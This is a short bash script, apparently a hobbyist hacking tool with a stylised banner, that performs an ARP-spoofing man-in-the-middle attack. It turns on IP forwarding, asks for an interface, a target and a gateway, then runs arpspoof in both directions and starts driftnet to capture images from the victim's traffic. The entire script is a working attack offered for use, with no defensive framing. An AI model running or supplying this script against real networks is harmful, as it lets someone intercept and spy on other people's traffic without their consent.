#!/bin/bash
echo 1 > /proc/sys/net/ipv4/ip_forward
echo -e "\033[1;34;70m


					 -------------------------------------------------------
					|			 WELCOME			|
					|			ONII CHAN	                |
					|@uth0r Astra.X               			|
					|                     		  m0d!f!3r B!n@ry N!5h@n|
					 -------------------------------------------------------   

\033[0m"
 
read -p "[+]Please Enter Interface Name: " Interface 
read -p "[+]Please Enter The Target:  " Target
read -p "[+]Please Enter The Host To Spoof Usually Gateway: " Gateway

echo -e "\n\n[+]Executing Both Commands\n\n"
arpspoof -i $Interface  -t  $Target $Gateway & arpspoof -i $Interface -t $Gateway $Target & driftnet

